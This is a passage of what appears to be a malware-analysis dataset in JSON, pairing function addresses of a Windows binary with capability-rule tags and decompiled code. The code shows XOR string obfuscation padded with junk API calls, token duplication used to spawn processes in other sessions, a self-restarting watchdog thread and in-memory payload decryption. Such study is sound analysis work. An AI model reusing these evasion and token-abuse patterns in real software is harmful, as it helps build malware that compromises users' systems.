            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00405bae(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint pszFile;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_54h;\n    int32_t var_50h;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t pProxyConfig;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t pszSrch;\n    int32_t var_28h;\n    uchar *psz1;\n    int32_t lpcwszUrl;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pProxyInfo;\n    int32_t psz2;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    puVar9 = &pProxyConfig;\n    psz1 = param_2;\n    for (iVar7 = 4; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &pszFile;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *param_2 = 0;\n        param_2 = param_2 + 1;\n    }\n    iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar7 != 0) && (iVar7 = fcn.00405b5a(),  iVar7 != 0)) {\n        iVar7 = 6;\n        uVar8 = 1;\n        var_40h = 6;\n        if (((pProxyConfig != 0) || (var_38h != 0)) &&\n           (iVar4 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  iVar4 != 0)) {\n            puVar9 = &pAutoProxyOptions;\n            for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            if (pProxyConfig != 0) {\n                pAutoProxyOptions = pAutoProxyOptions | 1;\n                var_54h = var_54h | 1;\n            }\n            if (var_38h != 0) {\n                pAutoProxyOptions = pAutoProxyOptions | 2;\n                var_50h = var_38h;\n            }\n            var_44h = 1;\n            puVar9 = &pProxyInfo;\n            for (iVar7 = 4; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar4, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar7 != 0) && (psz2 != 0)) {\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar4);\n                pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                if (var_8h != 0) {\n                    (*pcVar2)(var_8h);\n                }\n                goto code_r0x00405e9d;\n            }\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar4);\n            pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (var_8h != 0) {\n                (*pcVar2)(var_8h);\n            }\n        }\n        if (var_34h != 0) {\n            if (var_30h == 0) {\ncode_r0x00405d24:\n                iVar7 = var_34h;\n                iVar4 = fcn.0040cfb2();\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar4 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar7);\n                    goto code_r0x00405e9d;\n                }\n                pProxyInfo = 0x7936580a;\n                psz2 = 0x58124f19;\n                var_8h = 0x4f577931;\n                var_4h._0_2_ = 0x5862;\n                var_1ch = 0x79425862;\n                var_18h._0_2_ = 0x4f6d;\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                var_14h = 0;\n                var_28h = &pProxyInfo - iVar7;\n                pszSrch = iVar7;\n                do {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                    if (iVar4 != 0x7df4e6) {\n                        *(var_14h + iVar7) = *(&var_1ch + var_14h % var_40h) ^ (var_14h + iVar7)[var_28h];\n                    }\n                    var_14h = var_14h + 1;\n                } while (var_14h < 0xe);\n                pProxyInfo = 0x760e4a21;\n                psz2 = 0x4a397912;\n                var_8h = 0x79667609;\n                var_1ch = 0x767a4a49;\n                var_18h._0_2_ = 0x7966;\n                uVar8 = (*pcVar2)(8, 0x19);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                iVar4 = 0;\n                var_28h = &pProxyInfo - iVar7;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n                    iVar3 = pszSrch;\n                    if (iVar5 != 0xd7c659) {\n                        *(iVar4 + iVar7) = *(&var_1ch + iVar4 % var_40h) ^ (iVar4 + iVar7)[&pProxyInfo - iVar7];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0xc);\n                iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, pszSrch);\n                pszSrch = iVar4 == lpcwszUrl;\n                var_14h = 0;\n                lpcwszUrl = fcn.0040cfd8(&var_14h);\n                uVar8 = 1;\n                while (pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap,  lpcwszUrl != 0) {\n                    iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar7);\n                    if ((pszSrch == (iVar4 == lpcwszUrl)) && (iVar4 = fcn.0040cfb2(),  iVar4 != 0)) {\n                        (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar4 + 2);\n                        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n                        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*pcVar2)(uVar6);\n                        goto code_r0x00405e9d;\n                    }\n                    lpcwszUrl = fcn.0040cfd8(&var_14h);\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                uVar8 = (*pcVar2)(0, iVar3);\n                (*pcVar1)(uVar8);\n            }\n            else {\n                do {\n                    iVar7 = fcn.0040cfd8(&var_14h);\n                    if (iVar7 == 0) goto code_r0x00405d24;\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar7);\n                } while (iVar7 == 0);\n            }\n        }\n    }\n    uVar8 = 0;\ncode_r0x00405e9d:\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_38h != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar2)(var_34h);\n    }\n    if (var_30h != 0) {\n        (*pcVar2)(var_30h);\n    }\n    return uVar8;\n}\n",
        "token_count": 2281
    },
    "00407dcc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00407dcc(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint lpCommandLine;\n    int32_t var_b0h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint TokenHandle;\n    uint var_50h;\n    uint pSessionId;\n    uint hExistingToken;\n    int32_t *var_44h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint hToken;\n    uint var_8h;\n    uint var_4h;\n    \n    var_50h = 4;\n    var_38h._0_2_ = 0x1000;\n    piVar8 = param_2;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *piVar8 = 0;\n        piVar8 = piVar8 + 1;\n    }\n    pSessionId = 0;\n    puVar9 = &lpCommandLine;\n    var_44h = param_2;\n    for (iVar6 = 0x44; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hToken = 0;\n    puVar9 = &var_6ch;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hExistingToken = 0;\n    var_30h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (iVar6 != 0) {\n        var_64h = iVar6;\n        iVar2 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar6, 0x201eb, &hExistingToken);\n            if (iVar2 != 0) {\n                fcn.0040610f();\n                iVar2 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar2 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar6 != 0) {\n                        var_68h = 0x20;\n                        var_6ch = pSid;\n                        iVar6 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_6ch, iVar6 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_58h = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_58h, 4);\n                    iVar6 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_30h, hToken, 1);\n                    if (iVar6 == 0) {\n                        var_30h = 0;\n                    }\n                    else {\n                        var_50h = 0x404;\n                    }\n                    lpCommandLine = 0x44;\n                    var_2ch = 0x62584700;\n                    var_28h = 0x3134770c;\n                    var_24h = 0x47166216;\n                    var_20h = 0x773e6201;\n                    var_1ch = 0x62073123;\n                    var_18h = 0x62504711;\n                    var_14h = 0x312b7717;\n                    var_10h = 0x47776216;\n                    var_8h = 0x62314777;\n                    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x62);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar2 = 0;\n                    var_34h = &var_2ch - iVar6;\n                    var_60h = iVar6;\n                    do {\n                        iVar4 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                        if (iVar4 != 0x4077be) {\n                            var_5ch = 5;\n                            *(iVar2 + iVar6) = *(&var_8h + iVar2 % 5) ^ (iVar2 + iVar6)[var_34h];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x20);\n                    var_24h = 0x4e314543;\n                    var_20h = 0x45583056;\n                    var_1ch = 0x30464e28;\n                    var_18h = 0x4e694544;\n                    var_14h = 0x45483050;\n                    var_10h = 0x30354e22;\n                    var_8h = 0x4e474530;\n                    var_4h._0_2_ = 0x3035;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar2 = 0;\n                    var_34h = &var_24h - iVar6;\n                    do {\n                        iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                        piVar8 = var_44h;\n                        iVar4 = var_60h;\n                        if (iVar5 != 0x9f1c70) {\n                            var_34h = 6;\n                            *(iVar2 + iVar6) = *(&var_8h + iVar2 % 6) ^ (iVar2 + iVar6)[&var_24h - iVar6];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x18);\n                    var_88h._0_2_ = 0;\n                    var_b0h = var_60h;\n                    var_8ch = 1;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, iVar6, 0, 0, 0, 0, var_50h, var_30h, 0, &lpCommandLine, var_44h);\n                    pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*piVar8 != 0) {\n                        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*piVar8, 0x201eb, &TokenHandle);\n                        if (iVar2 != 0) {\n                            fcn.0040610f();\n                            (*pcVar7)(TokenHandle);\n                        }\n                        (*pcVar7)(var_44h[1]);\n                    }\n                    if (var_30h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_30h);\n                    }\n                    (*pcVar7)(hToken);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*pcVar1)(uVar3);\n                    param_2 = var_44h;\n                    iVar6 = var_64h;\n                }\n                (*pcVar7)(hExistingToken);\n            }\n        }\n        (*pcVar7)(iVar6);\n    }\n    return *param_2;\n}\n",
        "token_count": 2088
    },
    "004080fa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004080fa(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uchar *puVar10;\n    uint32_t *puVar11;\n    int32_t iStack580;\n    uint32_t uStack576;\n    uint uStack572;\n    uint32_t uStack568;\n    uint32_t uStack564;\n    int32_t iStack552;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    uStack576 = 0;\n    iStack580 = 0;\n    puVar10 = auStack544;\n    for (iVar8 = 0x10; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar11 = &uStack568;\n    for (iVar8 = 0x18; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    piVar9 = &iStack528;\n    for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *piVar9 = 0;\n        piVar9 = piVar9 + 1;\n    }\n    if (*0x41dd78 == 0) {\n        *0x41db20 = fcn.00408f53();\n        uVar6 = *0x41dd34;\n        iVar8 = *0x41dd30;\n    }\n    else {\n        *0x41db20 = fcn.00407dcc();\n        iVar5 = fcn.0040a771(&iStack580);\n        uVar6 = uStack576;\n        iVar8 = iStack580;\n        if (iVar5 != 0) goto code_r0x004081b3;\n    }\n    uStack564 = uVar6 >> 0x1f;\n    uStack568 = uVar6;\n    iStack552 = iVar8;\ncode_r0x004081b3:\n    iVar8 = iStack552;\n    uVar3 = uStack564;\n    uVar6 = uStack568;\n    if (*0x41db20 == 0) {\n        piVar9 = &iStack528;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        if (piVar9 - auStack526 >> 1 != 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&iStack528);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar4);\n        }\n    }\n    else {\n        fcn.0040786d();\n        if ((iVar8 != 0) && ((uVar6 | uVar3) != 0)) {\n            fcn.0040324c();\n            fcn.00409753((*0x41dd74 & 1) << 4);\n        }\n        uStack576 = *0x41db20;\n        uStack572 = *0x41db24;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack576, 0, 0xffffffff);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41db20, 0);\n        uVar7 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004080fa, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n        (*pcVar2)(*0x41db20);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 952
    },
    "0040828a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040828a(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    if (((*0x41dd78 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41db24, 0xffffffff),  iVar2 == 0))\n       && (*arg_8h == 0x20)) {\n        puVar6 = 0x41db28;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.0040786d();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004080fa, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x413010) = *(uVar5 + 0x413010) ^ \"5ITi6oOtv\"[uVar5 % 9];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x417410) = *(uVar5 + 0x417410) ^ *(uVar5 % 0xc + 0x41d610);\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x6200);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004076ac, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    while (*0x41ddd8 == 0) {\n        fcn.0040472d();\n        if (*0x41dd78 != 0) {\n            (*pcVar1)(1000);\n        }\n        (*pcVar1)(0x1e);\n    }\n    return 0;\n}\n",
        "token_count": 668
    },
    "00408400": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408400(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_324h;\n    uint var_11ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar9 = &var_11ch;\n    for (iVar7 = 0x104; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &var_324h;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    if (*0x41dd78 == 0) {\n        uVar6 = 0;\n        do {\n            if (*(uVar6 + 0x411790) == arg_ch) {\n                if (arg_10h == *0x41dd6c) {\n                    return 1;\n                }\n                if (arg_ch == -0x37b0bf10) {\n                    puVar9 = &var_11ch;\n                    for (iVar7 = 0x104; iVar7 != 0; iVar7 = iVar7 + -1) {\n                        *puVar9 = 0;\n                        puVar9 = puVar9 + 1;\n                    }\n                    var_11ch._0_1_ = 0;\n                    if ((arg_14h != 0) &&\n                       (iVar7 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar7 != 0)) {\n                        (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar7, &var_11ch, 0x104);\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar7);\n                    }\n                    pcVar5 = _sym.imp.KERNEL32.dll_lstrlenA;\n                    iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_11ch);\n                    if (iVar7 != 0) {\n                        (*pcVar5)(&var_11ch);\n                        iVar7 = fcn.0040b335();\n                        if (iVar7 == -0x37b0bf10) {\n                            return 1;\n                        }\n                    }\n                }\n                iVar7 = fcn.004083ac();\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                puVar9 = &var_324h;\n                for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                iVar7 = fcn.0040786d();\n                if (iVar7 == 0) {\n                    return 1;\n                }\n                iVar7 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_324h, 0x41db28);\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00408904, arg_10h, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n                return 1;\n            }\n            uVar6 = uVar6 + 4;\n        } while (uVar6 < 0x1c);\n    }\n    else if ((((arg_ch == 0x74fc6984) && (iVar7 = fcn.004083ac(),  iVar7 == 0)) && (iVar7 = fcn.0040786d(),  iVar7 != 0)\n             ) && (iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_324h),  iVar1 == 0)) {\n        var_18h = 0x14202a1b;\n        var_14h = 0x7d433d36;\n        var_10h = 0x3d3f1e7c;\n        var_ch._0_1_ = 0x70;\n        var_8h = 0x7a524f70;\n        var_4h._0_2_ = 0x5153;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetMessagePos)();\n            if (iVar3 != 0x3e5189) {\n                *(iVar8 + iVar7) = *(&var_8h + iVar8 % 6) ^ (iVar8 + iVar7)[&var_18h - iVar7];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0xd);\n        var_14h = 0xa2e3704;\n        var_10h = 0x1d3e2a36;\n        var_ch._0_1_ = 0x4b;\n        var_8h = 0x4b4a5345;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x42);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar3 = 0;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n            if (iVar4 != 0x7b1605) {\n                *(iVar3 + iVar8) = *(&var_8h + iVar3 % 5) ^ (iVar3 + iVar8)[&var_14h - iVar8];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 9);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar7, iVar8);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        (*pcVar5)(&var_324h);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        *(iVar3 + 8) = arg_10h;\n        uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00408e4d, iVar3, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar5)(uVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1718
    },
    "00408b2b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00408b2b(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint lpCommandLine;\n    uint var_44h;\n    \n    iVar2 = 0x44;\n    puVar3 = param_1;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_44h;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_44h = 0x44;\n    puVar3 = &lpCommandLine;\n    for (iVar1 = 0x208; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpCommandLine, 0x4117b0, *0x41dd68);\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_44h, param_1);\n    if (param_1[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[1]);\n    }\n    return *param_1;\n}\n",
        "token_count": 364
    },
    "00408ba8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00408ba8(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    code *pcVar8;\n    uint lpApplicationName;\n    uint lpCommandLine;\n    int32_t var_a8h;\n    uint var_84h;\n    uint var_80h;\n    uint var_64h;\n    uint var_60h;\n    int32_t *var_5ch;\n    uint var_58h;\n    int32_t ProcessHandle;\n    uint TokenHandle;\n    uint var_4ch;\n    uint pSessionId;\n    int32_t var_44h;\n    uint hExistingToken;\n    uint pSid;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pIdentifierAuthority;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint hToken;\n    \n    var_14h._0_2_ = 0x1000;\n    piVar6 = param_2;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar6 = 0;\n        piVar6 = piVar6 + 1;\n    }\n    puVar7 = &lpCommandLine;\n    